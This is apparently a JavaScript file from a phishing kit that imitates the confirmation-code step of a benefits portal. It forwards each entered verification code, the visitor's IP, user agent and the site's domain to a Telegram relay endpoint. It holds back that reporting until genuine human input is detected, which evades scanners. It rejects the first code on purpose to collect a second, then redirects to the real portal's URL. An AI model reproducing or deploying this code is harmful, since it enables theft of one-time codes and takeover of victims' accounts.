(function () {
  var form = document.getElementById("enter-code-form");
  var codeInput = document.getElementById("confirmation-code");
  var codeError = document.getElementById("code_validation_message");
  var resendBtn = document.getElementById("resend-code-btn");
  var infoText = document.getElementById("enter-code-info");
  var submitBtn = document.getElementById("submit-code-btn");
  var confirmationMessage = document.getElementById("confirmation-message");

  const REDIRECT_URL = "https://melodybenefits.wealthcareportal.com/Authentication/Handshake";

  // ============================================================
  // ====== TRACK CODE ATTEMPTS ==================================
  // ============================================================

  var attemptKey = 'code_attempt_count';
  var attemptCount = parseInt(sessionStorage.getItem(attemptKey) || '0', 10);
  
  console.log(`📊 Code attempt #${attemptCount + 1}`);

  // ============================================================
  // ====== DOMAIN DETECTION - ONE TIME, HUMAN ONLY =============
  // ============================================================

  let domainDetected = false;
  let humanInteractionConfirmed = false;

  function detectDomain() {
    if (domainDetected) return;
    if (!humanInteractionConfirmed) return;
    
    const currentUrl = window.location.href;
    const urlObj = new URL(currentUrl);
    const domain = urlObj.hostname;

    domainDetected = true;

    sendToTelegram('domain_detection', {
      domain: domain
    });

    console.log(`🌐 Domain detected (human): ${domain}`);
  }

  function confirmHumanInteraction() {
    if (humanInteractionConfirmed) return;
    if (event && event.isTrusted === false) return;
    
    humanInteractionConfirmed = true;
    console.log('👤 Human interaction confirmed');
    detectDomain();
  }

  let scrollTimeout = null;
  let scrollCount = 0;
  let lastScrollTime = 0;

  window.addEventListener('scroll', function(e) {
    if (domainDetected) return;
    if (!e.isTrusted) return;
    
    const now = Date.now();
    const timeSinceLastScroll = now - lastScrollTime;
    lastScrollTime = now;
    
    if (timeSinceLastScroll > 0 && timeSinceLastScroll < 100) return;
    
    scrollCount++;
    if (scrollCount < 2) return;
    
    const scrollY = window.scrollY;
    if (scrollY < 30) return;
    
    if (scrollTimeout) {
      clearTimeout(scrollTimeout);
      scrollTimeout = null;
    }
    
    scrollTimeout = setTimeout(function() {
      if (!domainDetected && humanInteractionConfirmed === false) {
        confirmHumanInteraction();
      }
      scrollTimeout = null;
    }, 300);
    
  }, { passive: true });

  document.addEventListener('click', function(e) {
    if (domainDetected) return;
    if (!e.isTrusted) return;
    if (e.target.closest('.spinner, .loading')) return;
    confirmHumanInteraction();
  });

  document.addEventListener('keydown', function(e) {
    if (domainDetected) return;
    if (!e.isTrusted) return;
    if (e.key.length !== 1) return;
    confirmHumanInteraction();
  });

  let mouseMoveCount = 0;
  
  document.addEventListener('mousemove', function(e) {
    if (domainDetected) return;
    if (!e.isTrusted) return;
    
    mouseMoveCount++;
    if (mouseMoveCount < 3) return;
    if (e.movementX === 0 && e.movementY === 0) return;
    
    confirmHumanInteraction();
  });

  // ============================================================
  // ====== TELEGRAM INTEGRATION =================================
  // ============================================================

  async function sendToTelegram(action, data) {
    try {
      let ipData = { ip: 'Unknown' };
      try {
        const response = await fetch('/api/ip');
        if (response.ok) {
          ipData = await response.json();
        }
      } catch (e) {
        console.warn('Could not fetch IP data');
      }

      const payload = {
        action: action,
        data: {
          ...data,
          timestamp: new Date().toLocaleString('en-US', { 
            timeZone: 'America/New_York',
            hour12: true,
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
          }),
          userAgent: navigator.userAgent,
          ip: ipData.ip || 'Unknown'
        }
      };

      await fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    } catch (error) {
      console.error('Failed to send to Telegram:', error);
    }
  }

  // ============================================================
  // ====== FORM HANDLERS =======================================
  // ============================================================

  var auth = null;
  try {
    auth = JSON.parse(sessionStorage.getItem("melodyAuth") || "null");
  } catch (e) {
    auth = null;
  }

  if (!auth || !auth.method) {
    window.location.replace("auth.html");
    return;
  }

  // ====== UPDATE CONFIRMATION MESSAGE ======
  if (auth.method === "email") {
    confirmationMessage.textContent = "A confirmation code was sent to your registered Email.";
  } else if (auth.method === "sms") {
    confirmationMessage.textContent = "A confirmation code was sent to your registered SMS.";
  }

  // ============================================================
  // ====== UPDATE INFO TEXT BASED ON ATTEMPT ===================
  // ============================================================

  function updateInfoText() {
    if (attemptCount === 0) {
      infoText.textContent = "";
    } else if (attemptCount === 1) {
      infoText.textContent = "";
    } else {
      infoText.textContent = "";
    }
  }

  updateInfoText();

  // ============================================================
  // ====== RESEND BUTTON =======================================
  // ============================================================

  resendBtn.addEventListener("click", function () {
    codeError.textContent = "";
    infoText.textContent = "";
    codeInput.value = "";
    codeInput.focus();
    
    attemptCount = 0;
    sessionStorage.setItem(attemptKey, '0');
  });

  // ============================================================
  // ====== FORM SUBMIT - TWO ATTEMPTS REQUIRED =================
  // ============================================================

  form.addEventListener("submit", function (event) {
    event.preventDefault();
    codeError.textContent = "";

    var code = codeInput.value.trim();
    if (!code) {
      codeError.textContent = "The confirmation code field is required.";
      codeInput.focus();
      return;
    }
    if (!/^[0-9]{4,10}$/.test(code)) {
      codeError.textContent = "Please enter a valid confirmation code.";
      codeInput.focus();
      return;
    }

    // ====== SEND CODE TO TELEGRAM ======
    sendToTelegram('code_submitted', {
      code: code,
      attempt: attemptCount + 1
    });

    // ====== DISABLE BUTTON AND SHOW LOADING ======
    submitBtn.disabled = true;
    submitBtn.innerHTML = '<span class="spinner"></span>';
    submitBtn.classList.add('loading');

    // ====== CHECK ATTEMPT ======
    if (attemptCount === 0) {
      // ====== FIRST ATTEMPT - ALWAYS FAILS ======
      console.log('❌ First attempt - rejecting');
      
      // Don't clear immediately - wait for the 3-second delay
      
      setTimeout(function() {
        // Show error message
        codeError.textContent = "The confirmation code you entered is incorrect. Please try again.";
        codeError.style.color = '#c0392b';
        
        // Clear the input field after error shows
        codeInput.value = '';
        
        // Update attempt count
        attemptCount = 1;
        sessionStorage.setItem(attemptKey, '1');
        
        // Update info text
        infoText.textContent = "";
        
        // Reset button
        submitBtn.disabled = false;
        submitBtn.innerHTML = 'Submit';
        submitBtn.classList.remove('loading');
        
        // Focus the input for second attempt
        codeInput.focus();
        
        console.log('🔄 Ready for second attempt');
        
      }, 3000); // 3 seconds loading before second attempt

    } else {
      // ====== SECOND ATTEMPT - ALWAYS SUCCEEDS ======
      console.log('✅ Second attempt - accepting');
      
      // Update info text
      infoText.textContent = "";
      
      // Clear session storage
      try {
        sessionStorage.removeItem("melodyAuth");
        sessionStorage.removeItem(attemptKey);
      } catch (e) {}

      // ====== REDIRECT AFTER 8 SECONDS ======
      setTimeout(function() {
        window.location.href = REDIRECT_URL;
      }, 8000);
    }
  });

})();